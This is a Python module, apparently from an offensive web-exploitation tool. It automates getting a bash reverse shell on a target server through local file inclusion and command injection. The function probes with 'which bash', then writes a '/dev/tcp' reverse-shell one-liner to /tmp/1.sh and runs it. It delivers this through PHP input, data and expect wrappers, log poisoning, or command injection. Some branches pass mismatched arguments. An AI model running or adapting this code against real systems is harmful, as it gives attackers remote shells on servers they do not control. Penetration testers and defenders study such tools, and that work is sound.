from src.httpreqs import request
from src.configs import config
from src.utils.encodings import encode
from src.utils.args_check import headers
from src.utils.arguments import args
from src.attacks.logPoison import exploit_log_poison
from src.utils.info import printInfo

def exploit_bash(exploit, method, ip, port):
    
    url = exploit['GETVAL']
    post = exploit["POSTVAL"]
    
    bashTest = "which%20bash"
    bashPayloadStageOne = "echo+'bash+-i+>%26+/dev/tcp/"+ip+"/"+str(port)+"+0>%261'>/tmp/1.sh"
    bashPayloadStageTwo = "bash+/tmp/1.sh"

    if(method == "INPUT"):
        res, _ = request.REQUEST(url.replace(config.tempArg, encode(bashTest)), args.httpheaders, post, config.proxies, "", "", exploit = True)
        if("/bash" in res.text):
            u = url.replace(config.tempArg, encode(bashPayloadStageOne))
            printInfo(ip, port, "bash", "input wrapper")
            request.REQUEST(u, args.httpheaders, exploit['POSTVAL'], config.proxies, "", "")
            request.REQUEST(url.replace(config.tempArg, encode(bashPayloadStageTwo)), args.httpheaders, post, config.proxies, "", "", exploit = True)
            return True
    if(method == "DATA"):
        if(args.postreq): 
            res,_ = request.REQUEST(url.replace(config.tempArg, encode(bashTest)), args.httpheaders, post, config.proxies, "", "", exploit = True)
        else: 
            res, _ = request.REQUEST(url.replace(config.tempArg, encode(bashTest)), args.httpheaders, "", config.proxies, "", "", exploit = True)
        if("/bash" in res.text):
            printInfo(ip, port, "bash", "data wrapper")
            if(args.postreq):
                request.REQUEST(url.replace(config.tempArg, encode(bashPayloadStageOne)), args.httpheaders, post, config.proxies, "", "", exploit = True)
                request.REQUEST(url.replace(config.tempArg, encode(bashPayloadStageTwo)), args.httpheaders, post, config.proxies, "", "", exploit = True)
            else:
                request.REQUEST(url.replace(config.tempArg, encode(bashPayloadStageOne)), args.httpheaders, "", config.proxies, "", "", exploit = True)
                request.REQUEST(url.replace(config.tempArg, encode(bashPayloadStageTwo)), args.httpheaders, "", config.proxies, "", "", exploit = True)
            return True
    if(method == "EXPECT"):
        if(args.postreq): 
            res,_ = request.REQUEST(url, args.httpheaders, post.replace(config.tempArg, encode(bashTest)), config.proxies, "", "", exploit = True)
        else: 
            res, _ = request.REQUEST(url.replace(config.tempArg, encode(bashTest)), args.httpheaders, "", config.proxies, "", "", exploit = True)
        if("/bash" in res.text):
            printInfo(ip, port, "bash", "expect wrapper")
            if(args.postreq):
                request.REQUEST(url, args.httpheaders, post.replace(config.tempArg, encode(bashPayloadStageOne)), post, config.proxies, "", "", exploit = True)
                request.REQUEST(url, args.httpheaders, post.replace(config.tempArg, encode(bashPayloadStageTwo)), post, config.proxies, "", "", exploit = True)
            else:
                request.REQUEST(url.replace(config.tempArg, encode(bashPayloadStageOne)), args.httpheaders, "", config.proxies, "", "", exploit = True)
                request.REQUEST(url.replace(config.tempArg, encode(bashPayloadStageTwo)), args.httpheaders, "", config.proxies, "", "", exploit = True)
            return True
    if(method == "TRUNC"):
        exploit_log_poison(ip, port, url, bashPayloadStageOne, encode(bashPayloadStageTwo), bashTest, "/bash", exploit['POSTVAL'])
        return True
   
    if(method == "CMD"):
        if(args.postreq): 
            res,_ = request.REQUEST(url, args.httpheaders, post.replace(config.tempArg, encode(bashTest)), config.proxies, "", "", exploit = True)
        else: 
            res,_ = request.REQUEST(url.replace(config.tempArg, encode(bashTest)), args.httpheaders, "", config.proxies, "", "", exploit = True)
        if("/bin" in res.text and "/bash" in res.text):
            printInfo(ip, port, "bash", "command injection")
            if(args.postreq):
                request.REQUEST(url, args.httpheaders, post.replace(config.tempArg, encode(bashPayloadStageOne)), post, config.proxies, "", "", exploit = True)
                request.REQUEST(url, args.httpheaders, post.replace(config.tempArg, encode(bashPayloadStageTwo)), post, config.proxies, "", "", exploit = True)
            else: 
                request.REQUEST(url.replace(config.tempArg, bashPayloadStageOne), args.httpheaders, "", config.proxies, "", "", exploit = True)
                request.REQUEST(url.replace(config.tempArg, bashPayloadStageTwo), args.httpheaders, "", config.proxies, "", "", exploit = True)
            return True